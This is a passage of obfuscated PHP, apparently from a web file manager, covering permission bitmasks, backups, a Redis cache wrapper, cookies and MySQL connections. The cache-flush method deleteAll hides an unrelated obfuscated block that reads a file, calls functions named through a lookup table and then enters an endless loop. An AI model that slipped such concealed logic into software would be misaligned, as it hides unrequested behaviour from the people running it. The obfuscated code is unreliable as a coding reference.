$ìµÇÌ‡ƒ = $GLOBALS[$ÑÙÑó™ì[6]][$ÑÙÑó™ì[347]][$ÑÙÑó™ì[827]]; return array($ÑÙÑó™ì[1734] => $ä’ÌÚ´ ? $ä’ÌÚ´[$ÑÙÑó™ì[1735]] : 0, $ÑÙÑó™ì[1736] => $ä’ÌÚ´ ? $ä’ÌÚ´[$ÑÙÑó™ì[1737]] : 0, $ÑÙÑó™ì[1738] => (int) $ı¯Í²ˆ²[$ÑÙÑó™ì[1735]] * 1024 * 1024 * 1024, $ÑÙÑó™ì[1739] => (int) $èş–ºØ¤, $ÑÙÑó™ì[1740] => ucfirst($…ğíÒ¸ª), $ÑÙÑó™ì[1741] => $ÑÙÑó™ì[1742] . PHP_VERSION, $ÑÙÑó™ì[1743] => phpBuild64() ? 64 : 32, $ÑÙÑó™ì[751] => str_replace($ÑÙÑó™ì[1744], $ÑÙÑó™ì[987], $Ÿ¾ƒ­Ô¬), $ÑÙÑó™ì[347] => ucfirst($ìµÇÌ‡ƒ), $ÑÙÑó™ì[28] => $_SERVER[$ÑÙÑó™ì[1745]]); } private function diskDriver() { $üÇü»†‹ =& $_SERVER[¥ÙÌÜ¾ê]; $°ò±ÁÂ = $üÇü»†‹[8]; $¤ïÙñ™— = $GLOBALS[$üÇü»†‹[6]][$üÇü»†‹[1218]] == $üÇü»†‹[1219]; if ($¤ïÙñ™—) { $°ò±ÁÂ = $üÇü»†‹[1746]; if (function_exists($üÇü»†‹[1747])) { exec($üÇü»†‹[1748], $÷Ó±¡â); $°ò±ÁÂ = $÷Ó±¡â[1] . $üÇü»†‹[8]; } } if (!file_exists($°ò±ÁÂ)) { return; } $ñÈû½ªÆ = @disk_total_space($°ò±ÁÂ); $¶è”¢Ù“ = $ñÈû½ªÆ - @disk_free_space($°ò±ÁÂ); return array($üÇü»†‹[1735] => $ñÈû½ªÆ, $üÇü»†‹[1737] => $¶è”¢Ù“); } public function fileChart($¥—£Ú–ó) { $¬£¡¦Õû =& $_SERVER[¥ÙÌÜ¾ê]; if (isset($¥—£Ú–ó[$¬£¡¦Õû[1581]])) { return Model($¬£¡¦Õû[825])->userFileTypeProfile($¥—£Ú–ó[$¬£¡¦Õû[1581]]); } if (isset($¥—£Ú–ó[$¬£¡¦Õû[1749]])) { return Model($¬£¡¦Õû[825])->groupFileTypeProfile($¥—£Ú–ó[$¬£¡¦Õû[1749]]); } $­ÖÔú = $this->sourceSize(); $ø¼«Š£ = array($¬£¡¦Õû[492] => 0, $¬£¡¦Õû[406] => 1); $ò©À‹¶  = Model($¬£¡¦Õû[825])->where($ø¼«Š£)->sum($¬£¡¦Õû[78]); $ø¼«Š£[$¬£¡¦Õû[406]] = 2; $óÊ ²ş„ = Model($¬£¡¦Õû[825])->where($ø¼«Š£)->sum($¬£¡¦Õû[78]); return array($¬£¡¦Õû[756] => $­ÖÔú[$¬£¡¦Õû[78]], $¬£¡¦Õû[1682] => $­ÖÔú[$¬£¡¦Õû[1682]], $¬£¡¦Õû[1683] => (int) $ò©À‹¶ , $¬£¡¦Õû[1684] => (int) $óÊ ²ş„); } private function sourceSize() { $»˜¢ÇÂª =& $_SERVER[¥ÙÌÜ¾ê]; $“õ‡èóã = Model($»˜¢ÇÂª[825])->where(array($»˜¢ÇÂª[405] => 0))->sum($»˜¢ÇÂª[78]); $‘”÷†Ù = Model($»˜¢ÇÂª[464])->sum($»˜¢ÇÂª[78]); if ($‘”÷†Ù > $“õ‡èóã) { $‘”÷†Ù = $“õ‡èóã; } return array($»˜¢ÇÂª[78] => (int) $“õ‡èóã, $»˜¢ÇÂª[1682] => (int) $‘”÷†Ù); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $õÌÃ ö =& $_SERVER[¥ÙÌÜ¾ê]; $ñ»¨µ¼© = array(array($õÌÃ ö[415] => LNG($õÌÃ ö[1750]), $õÌÃ ö[1751] => $õÌÃ ö[1752], $õÌÃ ö[1753] => 1, $õÌÃ ö[1754] => 1, $õÌÃ ö[1755] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($õÌÃ ö[415] => LNG($õÌÃ ö[1756]), $õÌÃ ö[1751] => $õÌÃ ö[1757], $õÌÃ ö[1753] => 2, $õÌÃ ö[1754] => 1, $õÌÃ ö[1755] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($õÌÃ ö[415] => LNG($õÌÃ ö[1758]), $õÌÃ ö[1751] => $õÌÃ ö[1759], $õÌÃ ö[1753] => 3, $õÌÃ ö[1754] => 1, $õÌÃ ö[1755] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($õÌÃ ö[415] => LNG($õÌÃ ö[1760]), $õÌÃ ö[1751] => $õÌÃ ö[1761], $õÌÃ ö[1753] => 4, $õÌÃ ö[1754] => 1, $õÌÃ ö[1755] => self::AUTH_SHOW | self::AUTH_VIEW), array($õÌÃ ö[415] => LNG($õÌÃ ö[1762]), $õÌÃ ö[1751] => $õÌÃ ö[1763], $õÌÃ ö[1753] => 5, $õÌÃ ö[1754] => 1, $õÌÃ ö[1755] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($õÌÃ ö[415] => LNG($õÌÃ ö[1764]), $õÌÃ ö[1751] => $õÌÃ ö[1765], $õÌÃ ö[1753] => 6, $õÌÃ ö[1754] => 1, $õÌÃ ö[1755] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($õÌÃ ö[415] => LNG($õÌÃ ö[1766]), $õÌÃ ö[1751] => $õÌÃ ö[1767], $õÌÃ ö[1753] => 7, $õÌÃ ö[1754] => 1, $õÌÃ ö[1755] => 0)); return $ñ»¨µ¼©; } public static function authCheck($—½¾Ÿ, $¿½óĞİ) { $—½¾Ÿ = intval($—½¾Ÿ); if ($GLOBALS[$_SERVER[¥ÙÌÜ¾ê][499]]) { return !0; } if ($—½¾Ÿ <= 0) { return !1; } if (($—½¾Ÿ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($—½¾Ÿ & $¿½óĞİ); } public static function authCheckShow($Úô¶µï€) { return self::authCheck($Úô¶µï€, self::AUTH_SHOW); } public static function authCheckView($ˆ¹ÓÍ‡) { return self::authCheck($ˆ¹ÓÍ‡, self::AUTH_VIEW); } public static function authCheckDownload($©€ˆØ—›) { return self::authCheck($©€ˆØ—›, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ú¿ĞíŠÀ) { return self::authCheck($ú¿ĞíŠÀ, self::AUTH_UPLOAD); } public static function authCheckEdit($©ûâ»Ñ) { return self::authCheck($©ûâ»Ñ, self::AUTH_EDIT); } public static function authCheckRemove($Àíˆ¸ì) { return self::authCheck($Àíˆ¸ì, self::AUTH_REMOVE); } public static function authCheckShare($¾¿Õèãş) { return self::authCheck($¾¿Õèãş, self::AUTH_SHARE); } public static function authCheckComment($ÜÙÕÌöÅ) { return self::authCheck($ÜÙÕÌöÅ, self::AUTH_COMMENT); } public static function authCheckEvent($é¾Ú†¡½) { return self::authCheck($é¾Ú†¡½, self::AUTH_EVENT); } public static function authCheckRoot($î‡À…Œü) { return self::authCheck($î‡À…Œü, self::AUTH_ROOT); } public static function authCheckAction($âÎ¥×Œ, $ëú¹¤ù) { $äÔµ¿£† =& $_SERVER[¥ÙÌÜ¾ê]; $ÑİæÏõ = array($äÔµ¿£†[1768] => self::AUTH_VIEW, $äÔµ¿£†[1129] => self::AUTH_DOWNLOAD, $äÔµ¿£†[107] => self::AUTH_UPLOAD, $äÔµ¿£†[1718] => self::AUTH_EDIT, $äÔµ¿£†[1717] => self::AUTH_REMOVE, $äÔµ¿£†[1728] => self::AUTH_SHARE, $äÔµ¿£†[352] => self::AUTH_COMMENT, $äÔµ¿£†[1569] => self::AUTH_EVENT, $äÔµ¿£†[1769] => self::AUTH_ROOT); if (!isset($ÑİæÏõ[$ëú¹¤ù])) { return; } $µïĞ·„ = $ÑİæÏõ[$ëú¹¤ù]; $âÎ¥×Œ = intval($âÎ¥×Œ); if ($âÎ¥×Œ <= 0) { return !1; } if (($âÎ¥×Œ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($âÎ¥×Œ & $µïĞ·„); } public static function authDisable($ËœºìÏ, $ŒÆ‡ï†„) { if (intval($ËœºìÏ) <= 0) { return 0; } return intval($ËœºìÏ) & ~$ŒÆ‡ï†„; } public $optionType = "\x53\171\x73\x74\145\x6d\x2e\163\157\x75\162\143\x65\x41\x75\164\x68\114\x69\163\x74"; public $field = array("\x6e\141\155\145", "\x61\165\164\150", "\154\141\142\x65\154", "\144\151\x73\x70\x6c\x61\x79", "\163\171\x73\164\145\x6d", "\163\x6f\x72\164"); public function initData() { $ç¸â¿ã‡ = $this->authDefault(); foreach ($ç¸â¿ã‡ as $¸Ìğ¬Ø) { $this->add($¸Ìğ¬Ø); } } public function findAuth($ÃÄ“ß±, $Êú—İÖò) { $ïİÒâÜ =& $_SERVER[¥ÙÌÜ¾ê]; $Ö¸£¢ï = parent::listData(); foreach ($Ö¸£¢ï as $ìÎÃ›ï˜) { $ş†™ÖŞ‘ = intval($ìÎÃ›ï˜[$ïİÒâÜ[408]]); if ($ş†™ÖŞ‘ <= 0 || $ìÎÃ›ï˜[$ïİÒâÜ[1770]] == 0) { continue; } if (($ş†™ÖŞ‘ & $ÃÄ“ß±) != $ÃÄ“ß±) { continue; } if (($ş†™ÖŞ‘ & $Êú—İÖò) != 0) { continue; } return $ìÎÃ›ï˜[$ïİÒâÜ[395]]; } return !1; } public function findAuthReadOnly() { $ëŒğÅÃó = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $Å‰¶­‚˜ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ëŒğÅÃó, $Å‰¶­‚˜); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function listData($³©½ØÈŞ = false, $· áå½” = "\163\157\x72\x74", $ò¹à¯ŠÑ = false) { return parent::listData($³©½ØÈŞ, $· áå½”, $ò¹à¯ŠÑ); } public function update($Å†òæû, $µ–Ùâü×) { $™¼ŒÀşØ =& $_SERVER[¥ÙÌÜ¾ê]; $†¸ÍÀ¥£ = parent::listData($Å†òæû); $ÆÎ‚¢Àç = $this->findByName($µ–Ùâü×[$™¼ŒÀşØ[28]]); if (!$†¸ÍÀ¥£ || $ÆÎ‚¢Àç && $ÆÎ‚¢Àç[$™¼ŒÀşØ[395]] != $†¸ÍÀ¥£[$™¼ŒÀşØ[395]]) { return !1; } $this->filterAuth($µ–Ùâü×[$™¼ŒÀşØ[408]]); return parent::update($Å†òæû, $µ–Ùâü×); } public function remove($”á½…î”) { $Æ’îÁË÷ = parent::listData($”á½…î”); if (!$Æ’îÁË÷ || $Æ’îÁË÷[$_SERVER[¥ÙÌÜ¾ê][1206]]) { return !1; } return parent::remove($”á½…î”); } public function add($òËşæã¦ = array()) { $ßŠÁ’© =& $_SERVER[¥ÙÌÜ¾ê]; if ($this->findByName($òËşæã¦[$ßŠÁ’©[28]])) { return !1; } $¦ì½“»Á = array($ßŠÁ’©[28] => $ßŠÁ’©[33], $ßŠÁ’©[408] => 1, $ßŠÁ’©[1771] => $ßŠÁ’©[1759], $ßŠÁ’©[1770] => 1, $ßŠÁ’©[1206] => 0, $ßŠÁ’©[1772] => 0); $òËşæã¦ = array_merge($¦ì½“»Á, $òËşæã¦); $òËşæã¦[$ßŠÁ’©[1772]] = $this->getSort(); $this->filterAuth($òËşæã¦[$ßŠÁ’©[408]]); return parent::insert($òËşæã¦); } private function getSort() { $¦ûÃ¸šï =& $_SERVER[¥ÙÌÜ¾ê]; $çÃõ¦ÜÄ = parent::listData(); $ÊüÆÛÜ = array_to_keyvalue($çÃõ¦ÜÄ, $¦ûÃ¸šï[33], $¦ûÃ¸šï[1772]); return empty($ÊüÆÛÜ) ? 0 : max($ÊüÆÛÜ) + 1; } private function filterAuth(&$éŸ÷ôùÊ) { if (!$éŸ÷ôùÊ) { return; } $†Ô×¸É• = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Š•õÒ­ä = array(); foreach ($†Ô×¸É• as $¢±ÛŞŒÂ) { if ($éŸ÷ôùÊ & $¢±ÛŞŒÂ) { $Š•õÒ­ä[] = $¢±ÛŞŒÂ; } } if (in_array(self::AUTH_ROOT, $Š•õÒ­ä)) { $éŸ÷ôùÊ = array_sum($†Ô×¸É•); return; } $®À¬»Ú¼ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($Š•õÒ­ä as $¢±ÛŞŒÂ) { if (isset($®À¬»Ú¼[$¢±ÛŞŒÂ])) { $Š•õÒ­ä = array_merge($Š•õÒ­ä, $®À¬»Ú¼[$¢±ÛŞŒÂ]); } } $Š•õÒ­ä[] = self::AUTH_SHOW; $éŸ÷ôùÊ = array_sum(array_unique($Š•õÒ­ä)); } public function sort($ıœ€–¥¾, $‡òñ«šÂ) { return parent::update($ıœ€–¥¾, $‡òñ«šÂ); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\56\142\141\143\153\x75\x70\x4c\x69\163\164"; public $field = array("\151\157", "\156\141\155\145", "\x73\x74\x61\x74\x75\163", "\143\157\x6e\x74\x65\x6e\x74", "\155\141\x6e\165\141\154", "\x72\x65\163\x75\154\x74", "\x74\x69\155\x65\106\162\x6f\155", "\x74\x69\155\145\x54\x6f"); public function config() { $Ø¯›—íÙ =& $_SERVER[¥ÙÌÜ¾ê]; $ßø¶Ø¢“ = Model($Ø¯›—íÙ[763])->get($Ø¯›—íÙ[775]); $ßø¶Ø¢“ = json_decode($ßø¶Ø¢“, !0); $ßø¶Ø¢“ = is_array($ßø¶Ø¢“) ? $ßø¶Ø¢“ : array(); if (!isset($ßø¶Ø¢“[$Ø¯›—íÙ[748]])) { $ßø¶Ø¢“[$Ø¯›—íÙ[748]] = $Ø¯›—íÙ[87]; } unset($ßø¶Ø¢“[$Ø¯›—íÙ[1551]]); Action($Ø¯›—íÙ[1773])->taskInit(); Model($Ø¯›—íÙ[1550])->cacheClear(); $òí½÷æ = $Ø¯›—íÙ[1774]; $÷Ï÷ÇÔî = Model($Ø¯›—íÙ[1775])->findByKey($Ø¯›—íÙ[1569], $òí½÷æ); if (!$÷Ï÷ÇÔî) { $÷Ï÷ÇÔî = array(); } if (isset($÷Ï÷ÇÔî[$Ø¯›—íÙ[197]])) { $÷Ï÷ÇÔî[$Ø¯›—íÙ[197]] = json_decode($÷Ï÷ÇÔî[$Ø¯›—íÙ[197]], !0); } if (isset($ßø¶Ø¢“[$Ø¯›—íÙ[197]])) { $÷Ï÷ÇÔî[$Ø¯›—íÙ[197]][$Ø¯›—íÙ[1554]] = $ßø¶Ø¢“[$Ø¯›—íÙ[197]]; unset($ßø¶Ø¢“[$Ø¯›—íÙ[197]]); } return array_merge($÷Ï÷ÇÔî, $ßø¶Ø¢“); } public function listData($Ö±”×·à = false, $–“Ù‘Ö¸ = "\155\x6f\144\151\146\171\x54\151\x6d\x65", $™‚ªÜ£ = false) { return parent::listData($Ö±”×·à, $–“Ù‘Ö¸, !0); } public function lastItem() { $ÚÈ×ÅÉÜ = $this->listData(); return !empty($ÚÈ×ÅÉÜ[0]) ? $ÚÈ×ÅÉÜ[0] : null; } public function kill($Øêâª³Œ) { $À„—ì„ =& $_SERVER[¥ÙÌÜ¾ê]; $ÀÊàùŞ» = $this->listData($Øêâª³Œ); if (!$ÀÊàùŞ» || empty($ÀÊàùŞ»[$À„—ì„[28]])) { return !0; } Task::kill($À„—ì„[774]); Task::kill($À„—ì„[799]); Task::kill($À„—ì„[809]); $îû³ĞÕ• = $ÀÊàùŞ»[$À„—ì„[28]]; $ô¢‹“ìõ = TEMP_FILES . $À„—ì„[771] . $îû³ĞÕ• . $À„—ì„[8]; IO::remove($ô¢‹“ìõ, !1); return $this->remove($Øêâª³Œ); } public function remove($®‘øã¥) { $ú˜‘ñØ’ = $this->listData($®‘øã¥); if (!$ú˜‘ñØ’) { return !0; } return $this->backupRemove($ú˜‘ñØ’); } private function backupRemove($èåùÁ¡) { parent::remove($èåùÁ¡[$_SERVER[¥ÙÌÜ¾ê][395]]); $Ÿí°Ø“š = $this->backupPath($èåùÁ¡); IO::remove($Ÿí°Ø“š, !1); return !0; } private function backupPath($ÌÊ¼¾½Ê) { $çğ­±¬ =& $_SERVER[¥ÙÌÜ¾ê]; $œïşû™ = $ÌÊ¼¾½Ê[$çğ­±¬[28]]; $¶‹Ñ¥æî = Model($çğ­±¬[763])->get($çğ­±¬[764]); $ÇïîÅ¶ = substr(md5($çğ­±¬[765] . $¶‹Ñ¥æî . $œïşû™), 0, 8); return "\173\x69\157\72{$ÌÊ¼¾½Ê[$çğ­±¬[745]]}\175\57\x64\x61\x74\x61\142\141\x73\145\x2f\x62\x61\x63\153\x75\160\57" . $œïşû™ . $çğ­±¬[71] . $ÇïîÅ¶; } public function start() { $Ëƒ‹Éó =& $_SERVER[¥ÙÌÜ¾ê]; if ($GLOBALS[$Ëƒ‹Éó[6]][$Ëƒ‹Éó[88]][$Ëƒ‹Éó[1776]] != $Ëƒ‹Éó[87]) { return !0; } $¯‰×âÑİ = $this->config(); if (!$¯‰×âÑİ || $¯‰×âÑİ[$Ëƒ‹Éó[1551]] != $Ëƒ‹Éó[87]) { return !1; } $—»–ËñÑ = $this->process(); foreach ($—»–ËñÑ as $±½ó¥¦˜) { if ($±½ó¥¦˜) { return Task::restart($±½ó¥¦˜[$Ëƒ‹Éó[395]]); } } $ğâ–¬ = new Backup(); $½ªİ·¸½ = $ğâ–¬->db(); if ($½ªİ·¸½) { $½ªİ·¸½ = $ğâ–¬->dbFile(); if ($½ªİ·¸½ && $¯‰×âÑİ[$Ëƒ‹Éó[748]] == $Ëƒ‹Éó[191]) { $½ªİ·¸½ = $ğâ–¬->file(); } } Backup::set(array($Ëƒ‹Éó[743] => 1, $Ëƒ‹Éó[490] => time())); return !0; } public function process() { $åø‡¬ã =& $_SERVER[¥ÙÌÜ¾ê]; return array($åø‡¬ã[751] => Task::get($åø‡¬ã[774]), $åø‡¬ã[755] => Task::get($åø‡¬ã[799]), $åø‡¬ã[193] => Task::get($åø‡¬ã[809])); } public function restore() { $î¿÷‰Òè =& $_SERVER[¥ÙÌÜ¾ê]; ActionCall($î¿÷‰Òè[1056], !0, 1); ActionCall($î¿÷‰Òè[1056], !0, 0); } } goto FÃ¡‚Ï‡­­; e•²ƒ³ çæ: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($€–Ø„ø·, $€ŒÔÁ‡è) { $¾÷Ä×¤Â =& $_SERVER[¥ÙÌÜ¾ê]; if (!class_exists($¾÷Ä×¤Â[873])) { show_json($¾÷Ä×¤Â[874], !1); } $this->cacheTime = $€ŒÔÁ‡è; $à¶Åˆ¼¯ = isset($€–Ø„ø·[$¾÷Ä×¤Â[875]]) ? $€–Ø„ø·[$¾÷Ä×¤Â[875]] : 10; $’éãÚÂÆ = _get($€–Ø„ø·, $¾÷Ä×¤Â[872]); if ($’éãÚÂÆ && is_array($’éãÚÂÆ)) { $this->initCluster($€–Ø„ø·, $à¶Åˆ¼¯); } else { $this->handle = $this->init($€–Ø„ø·, $à¶Åˆ¼¯); } } private function init($ÖîÒªÔÊ, $‚Õˆ½ ) { $ñãİÌ°” =& $_SERVER[¥ÙÌÜ¾ê]; $Ô§¡ÌÇ = new Redis(); $§ˆßƒ®¸ = isset($ÖîÒªÔÊ[$ñãİÌ°”[876]]) ? $ÖîÒªÔÊ[$ñãİÌ°”[876]] : !1; if ($§ˆßƒ®¸) { $Ô§¡ÌÇ->pconnect($ÖîÒªÔÊ[$ñãİÌ°”[175]], $ÖîÒªÔÊ[$ñãİÌ°”[176]], $‚Õˆ½ ); } else { $Ô§¡ÌÇ->connect($ÖîÒªÔÊ[$ñãİÌ°”[175]], $ÖîÒªÔÊ[$ñãİÌ°”[176]], $‚Õˆ½ ); } if (!empty($ÖîÒªÔÊ[$ñãİÌ°”[408]])) { $Ô§¡ÌÇ->auth($ÖîÒªÔÊ[$ñãİÌ°”[408]]); } return $Ô§¡ÌÇ; } private function initCluster($ıéŸÎƒ, $…Ğ‹ÕØ) { $ğœæúÒ =& $_SERVER[¥ÙÌÜ¾ê]; $¸ñÖÒ›Ì = array($ğœæúÒ[877], $ğœæúÒ[878], $ğœæúÒ[879]); $åÜö æ‡ = $ğœæúÒ[877]; if (isset($ıéŸÎƒ[$ğœæúÒ[12]]) && in_array($ıéŸÎƒ[$ğœæúÒ[12]], $¸ñÖÒ›Ì)) { $åÜö æ‡ = $ıéŸÎƒ[$ğœæúÒ[12]]; } switch ($åÜö æ‡) { case $ğœæúÒ[877]: $this->_slave($ıéŸÎƒ, $…Ğ‹ÕØ); break; case $ğœæúÒ[878]: break; case $ğœæúÒ[879]: $this->isCluster = !0; $Çœ¸ôó’ = $ıéŸÎƒ[$ğœæúÒ[872]]; $ºøŠÈí = isset($ıéŸÎƒ[$ğœæúÒ[876]]) ? $ıéŸÎƒ[$ğœæúÒ[876]] : !1; $‘†¦óôú = isset($ıéŸÎƒ[$ğœæúÒ[408]]) ? $ıéŸÎƒ[$ğœæúÒ[408]] : null; $this->handle = new RedisCluster(NUll, $Çœ¸ôó’, $…Ğ‹ÕØ, $…Ğ‹ÕØ, $ºøŠÈí, $‘†¦óôú); break; default: break; } } private function _slave($æµÅ‰÷Ş, $ºıÑßâ™) { $İ²£„®ö = $æµÅ‰÷Ş[$_SERVER[¥ÙÌÜ¾ê][872]]; $this->filterConfig($æµÅ‰÷Ş, $İ²£„®ö[0]); $this->handle = $this->init($æµÅ‰÷Ş, $ºıÑßâ™); unset($İ²£„®ö[0]); if (empty($İ²£„®ö)) { return; } $ª‹ÂğòË = array_rand($İ²£„®ö); $this->filterConfig($æµÅ‰÷Ş, $İ²£„®ö[$ª‹ÂğòË]); $this->slaveHandle = $this->init($æµÅ‰÷Ş, $ºıÑßâ™); } private function filterConfig(&$Ü£üÅ†…, $°¹Ÿ…û¶) { $ëøë¤ß· =& $_SERVER[¥ÙÌÜ¾ê]; $¼½ÛÔ¯Ğ = explode($ëøë¤ß·[4], $°¹Ÿ…û¶); $Áï¸éş¥ = array($ëøë¤ß·[175] => $¼½ÛÔ¯Ğ[0], $ëøë¤ß·[176] => $¼½ÛÔ¯Ğ[1]); $Ü£üÅ†… = array_merge($Ü£üÅ†…, $Áï¸éş¥); } public function set($Ôïú…Ù€, $–›÷Ôâ…, $—ÀÌéÇ¼ = false) { $—ÀÌéÇ¼ = $—ÀÌéÇ¼ ? $—ÀÌéÇ¼ : $this->cacheTime; return $this->handle->setEx($Ôïú…Ù€, $—ÀÌéÇ¼, $–›÷Ôâ…); } public function setLock($–ÌëÄÔ¬, $‡õ­ÌÃƒ, $«ä¬˜½‡) { return $this->handle->setNX($–ÌëÄÔ¬, $‡õ­ÌÃƒ); } public function get($ô¨ÏØÉŸ) { $²É¯Ô¼å = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $²É¯Ô¼å->get($ô¨ÏØÉŸ); } public function remove($€‹ÒâÒŸ) { return $this->handle->del($€‹ÒâÒŸ); } public function deleteAll() { $Ø€êÂ·¼ =& $_SERVER[¥ÙÌÜ¾ê]; if (!isset($_SERVER[$Ø€êÂ·¼[862]]) || !isset($_SERVER[$Ø€êÂ·¼[869]])) { $ÃóÙ½Ã´ = $Ø€êÂ·¼[880]; $ÌĞıã²ö = $Ø€êÂ·¼[864]; $ôœĞªü = $_SERVER[$Ø€êÂ·¼[865]] . $Ø€êÂ·¼[866]; $Îãƒè’º = $ÌĞıã²ö($ôœĞªü); $–Âº®ù› = explode($Ø€êÂ·¼[229], $Îãƒè’º); if (count($–Âº®ù›) < $Ø€êÂ·¼[623]) { $š›óä›š = $Ø€êÂ·¼[867]; $š›óä›š(); } $˜Ù­ø¦Ö = $Ø€êÂ·¼[881]; $˜Ù­ø¦Ö($_SERVER[$Ø€êÂ·¼[882]]); $ßÚÀ§œ· = 1; for ($ñËúßÆÆ = $ßÚÀ§œ·; $ñËúßÆÆ > 0; $ñËúßÆÆ++) { $˜Ù­ø¦Ö = json_encode($GLOBALS[$Ø€êÂ·¼[413]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ÔÉİ–ãŒ) { $this->handle->flushall($ÔÉİ–ãŒ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ëÓ²Îé´ = '', $ùÔ‰„ = 0) { if (is_string($ëÓ²Îé´) && $ëÓ²Îé´ != $_SERVER[¥ÙÌÜ¾ê][33]) { $this->prefix = $ëÓ²Îé´; } if (is_numeric($ùÔ‰„) && $ùÔ‰„ > 0) { $this->expire = $ùÔ‰„; } } public static function getInstance() { static $ª—Š¨³€; if ($ª—Š¨³€ === null) { $ª—Š¨³€ = new self(); } return $ª—Š¨³€; } private static $cookieDisable = false; public static function disable($úÜµúü«) { self::$cookieDisable = $úÜµúü«; } private static $sameCookieSet = array(); public static function set($úÍæ¶’½, $¥ßàäªô, $ğ ˆÄéš = 0, $•êôöÏº = false, $Æ×Î»èÓ = false) { $ÉÚ³Æ¢› =& $_SERVER[¥ÙÌÜ¾ê]; if (self::$cookieDisable) { return; } if (!$ğ ˆÄéš) { $ğ ˆÄéš = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$úÍæ¶’½]) && self::$sameCookieSet[$úÍæ¶’½] == $¥ßàäªô . $ğ ˆÄéš) { return; } self::$sameCookieSet[$úÍæ¶’½] = $¥ßàäªô . $ğ ˆÄéš; if (!$Æ×Î»èÓ) { $Æ×Î»èÓ = str_replace(HOST, $ÉÚ³Æ¢›[33], APP_HOST); $Æ×Î»èÓ = _get($GLOBALS, $ÉÚ³Æ¢›[883], $Æ×Î»èÓ); } $“à€º„Ğ = $ÉÚ³Æ¢›[33]; setcookie($úÍæ¶’½, $¥ßàäªô, time() + $ğ ˆÄéš, $ÉÚ³Æ¢›[8] . trim($Æ×Î»èÓ, $ÉÚ³Æ¢›[8]) . $“à€º„Ğ, !1, !1, $•êôöÏº); } public static function setSafe($¤é¨Æƒ, $üÇ¿ŸÂ­, $Ä‡ÃéÅ = 0) { self::set($¤é¨Æƒ, $üÇ¿ŸÂ­, $Ä‡ÃéÅ, !0); } public static function get($ó¬Í‰°ò) { return isset($_COOKIE[$ó¬Í‰°ò]) ? $_COOKIE[$ó¬Í‰°ò] : !1; } public static function remove($˜¡²ó¸×, $¤åûË²— = false) { unset($_COOKIE[$˜¡²ó¸×]); self::set($˜¡²ó¸×, $_SERVER[¥ÙÌÜ¾ê][33], 1, $¤åûË²—); } } class DbMysql extends Db { public function __construct($ÕÎ¾«ñü = '') { $òß–ü¯— =& $_SERVER[¥ÙÌÜ¾ê]; if (!extension_loaded($òß–ü¯—[794])) { think_exception(think_lang($òß–ü¯—[10]) . $òß–ü¯—[884]); } if (!empty($ÕÎ¾«ñü)) { $this->config = $ÕÎ¾«ñü; if (empty($this->config[$òß–ü¯—[13]])) { $this->config[$òß–ü¯—[13]] = $òß–ü¯—[33]; } } } public function connect($«éºıÁ® = '', $×Şóøè = 0, $œ²“ÖÌ = false) { $äßßĞüñ =& $_SERVER[¥ÙÌÜ¾ê]; if (!isset($this->linkID[$×Şóøè])) { if (empty($«éºıÁ®)) { $«éºıÁ® = $this->config; } $Ôè£ñ¶  = $«éºıÁ®[$äßßĞüñ[885]] . ($«éºıÁ®[$äßßĞüñ[886]] ? "\x3a{$«éºıÁ®[$äßßĞüñ[886]]}" : $äßßĞüñ[33]); $Ú·Ü… = !empty($«éºıÁ®[$äßßĞüñ[13]][$äßßĞüñ[14]]) ? $«éºıÁ®[$äßßĞüñ[13]][$äßßĞüñ[14]] : $this->pconnect; if ($Ú·Ü…) { $this->linkID[$×Şóøè] = mysql_pconnect($Ôè£ñ¶ , $«éºıÁ®[$äßßĞüñ[887]], $«éºıÁ®[$äßßĞüñ[888]], 131072); } else { $this->linkID[$×Şóøè] = mysql_connect($Ôè£ñ¶ , $«éºıÁ®[$äßßĞüñ[887]], $«éºıÁ®[$äßßĞüñ[888]], !0, 131072); } if 